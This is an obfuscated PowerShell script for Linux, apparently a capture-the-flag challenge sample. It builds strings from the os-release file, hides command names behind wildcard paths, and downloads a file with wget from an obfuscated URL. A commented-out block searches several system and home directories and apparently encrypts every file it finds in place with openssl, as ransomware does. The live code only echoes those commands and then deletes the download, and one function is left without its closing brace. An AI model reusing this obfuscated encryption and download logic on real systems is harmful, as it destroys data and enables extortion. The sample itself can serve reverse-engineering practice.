function first 
{
    second
    third
    fourth
    # fifth
    # sixth
    exit
}

function second 
{
    # if ([int](id -u) -cne -not [bool][byte]){exit}
    # if (-not ((&(Get-Command /???/?at) ./*-release*) | grep noble)){exit}
    # if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard in chal to prevent accidentally running the script
}

function third
{
    $v1 = (&(Get-Command /???/?at) ./*release*).split('\n')
    $v2 = ($v1[0] += $v1[1].split('=')[0] += $v1[2] += $v1[3].split('=')[0] += $v1[4].split('=')[0] += $v1[5] += $v1[6].split('=')[0] += $v1[7].split('=')[0] += $v1[8] += $v1[9] += $v1[10] += $v1[11] += $v1[12] += $v1[13] += $v1[14] += $v1[15] += $v1[16]).Tochararray() + 0..9
    $v2 = (-join ($v2 | sort-object | get-unique))
    echo $v2
    $Global:g1 = $v2
}

function fourth 
{
    $v1 = $GLOBAL:g1[3] + $GLOBAL:g1[5] + $GLOBAL:g1[12] + $GLOBAL:g1[8] + $GLOBAL:g1[7] + $GLOBAL:g1[12] + $GLOBAL:g1[1] + $GLOBAL:g1[6] + $GLOBAL:g1[5] + $GLOBAL:g1[12] + $GLOBAL:g1[6] + $GLOBAL:g1[5] + $GLOBAL:g1[14] + $GLOBAL:g1[3] + $GLOBAL:g1[1] + $GLOBAL:g1[3] + $GLOBAL:g1[3] + $GLOBAL:g1[7] + $GLOBAL:g1[13] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56]
    $v2 = $GLOBAL:g1[16]
    &(Get-Command /???/?ge?) $v1 -q -O $v2
}

# function fifth
# {
#     foreach ($v1 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[52] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')))
#     {
#         &(Get-Command I?????-E?????????) ("" + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + $GLOBAL:g1[45] + ' ' + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[37] + $GLOBAL:g1[41] + $GLOBAL:g1[51] + $GLOBAL:g1[11] + $GLOBAL:g1[2] + $GLOBAL:g1[5] + $GLOBAL:g1[6] + $GLOBAL:g1[11] + $GLOBAL:g1[39] + $GLOBAL:g1[38] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[49] + $GLOBAL:g1[37] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + ' ' + 'f' + $GLOBAL:g1[44] + $GLOBAL:g1[45] + $GLOBAL:g1[41] + $GLOBAL:g1[14] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[44] + $GLOBAL:g1[47] + ' ' + " $v1 " + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[48] + $GLOBAL:g1[53] + $GLOBAL:g1[52] + ' ' + " $v1 ")
#     } 

#     foreach ($v1 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[43] + $GLOBAL:g1[48] + $GLOBAL:g1[46] + $GLOBAL:g1[41] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')))
#     {
#         &(Get-Command I?????-E?????????) ("" + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + $GLOBAL:g1[45] + ' ' + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[37] + $GLOBAL:g1[41] + $GLOBAL:g1[51] + $GLOBAL:g1[11] + $GLOBAL:g1[2] + $GLOBAL:g1[5] + $GLOBAL:g1[6] + $GLOBAL:g1[11] + $GLOBAL:g1[39] + $GLOBAL:g1[38] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[49] + $GLOBAL:g1[37] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + ' ' + 'f' + $GLOBAL:g1[44] + $GLOBAL:g1[45] + $GLOBAL:g1[41] + $GLOBAL:g1[14] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[44] + $GLOBAL:g1[47] + ' ' + " $v1 " + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[48] + $GLOBAL:g1[53] + $GLOBAL:g1[52] + ' ' + " $v1 ")
#     } 

#     foreach ($v1 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[41] + $GLOBAL:g1[52] + $GLOBAL:g1[39] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f' )))
#     {
#         &(Get-Command I?????-E?????????) ("" + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + $GLOBAL:g1[45] + ' ' + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[37] + $GLOBAL:g1[41] + $GLOBAL:g1[51] + $GLOBAL:g1[11] + $GLOBAL:g1[2] + $GLOBAL:g1[5] + $GLOBAL:g1[6] + $GLOBAL:g1[11] + $GLOBAL:g1[39] + $GLOBAL:g1[38] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[49] + $GLOBAL:g1[37] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + ' ' + 'f' + $GLOBAL:g1[44] + $GLOBAL:g1[45] + $GLOBAL:g1[41] + $GLOBAL:g1[14] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[44] + $GLOBAL:g1[47] + ' ' + " $v1 " + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[48] + $GLOBAL:g1[53] + $GLOBAL:g1[52] + ' ' + " $v1 ")
#     } 

#     foreach ($v1 in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[54] + $GLOBAL:g1[37] + $GLOBAL:g1[50] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')))
#     {
#         &(Get-Command I?????-E?????????) ("" + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + $GLOBAL:g1[45] + ' ' + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[37] + $GLOBAL:g1[41] + $GLOBAL:g1[51] + $GLOBAL:g1[11] + $GLOBAL:g1[2] + $GLOBAL:g1[5] + $GLOBAL:g1[6] + $GLOBAL:g1[11] + $GLOBAL:g1[39] + $GLOBAL:g1[38] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[49] + $GLOBAL:g1[37] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + ' ' + 'f' + $GLOBAL:g1[44] + $GLOBAL:g1[45] + $GLOBAL:g1[41] + $GLOBAL:g1[14] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[44] + $GLOBAL:g1[47] + ' ' + " $v1 " + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[48] + $GLOBAL:g1[53] + $GLOBAL:g1[52] + ' ' + " $v1 ")
#     }
# }

function fifth
{
    echo ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[52] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')
    echo ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[43] + $GLOBAL:g1[48] + $GLOBAL:g1[46] + $GLOBAL:g1[41] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')
    echo ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[41] + $GLOBAL:g1[52] + $GLOBAL:g1[39] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f' )
    echo ('f' + $GLOBAL:g1[44] + $GLOBAL:g1[47] + $GLOBAL:g1[40] + ' ' + $GLOBAL:g1[13] + $GLOBAL:g1[54] + $GLOBAL:g1[37] + $GLOBAL:g1[50] + $GLOBAL:g1[13] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[52] + $GLOBAL:g1[56] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + ' ' + 'f')
    echo ("" + $GLOBAL:g1[48] + $GLOBAL:g1[49] + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + $GLOBAL:g1[45] + ' ' + $GLOBAL:g1[41] + $GLOBAL:g1[47] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[37] + $GLOBAL:g1[41] + $GLOBAL:g1[51] + $GLOBAL:g1[11] + $GLOBAL:g1[2] + $GLOBAL:g1[5] + $GLOBAL:g1[6] + $GLOBAL:g1[11] + $GLOBAL:g1[39] + $GLOBAL:g1[38] + $GLOBAL:g1[39] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[49] + $GLOBAL:g1[37] + $GLOBAL:g1[51] + $GLOBAL:g1[51] + ' ' + 'f' + $GLOBAL:g1[44] + $GLOBAL:g1[45] + $GLOBAL:g1[41] + $GLOBAL:g1[14] + 'k' + $GLOBAL:g1[41] + $GLOBAL:g1[56] + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[44] + $GLOBAL:g1[47] + ' ' + " $v1 " + ' ' + $GLOBAL:g1[11] + $GLOBAL:g1[48] + $GLOBAL:g1[53] + $GLOBAL:g1[52] + ' ' + " $v1 ")

function sixth
{
    &(Get-Command R?m???-I???) $GLOBAL:g1[16]
}


first
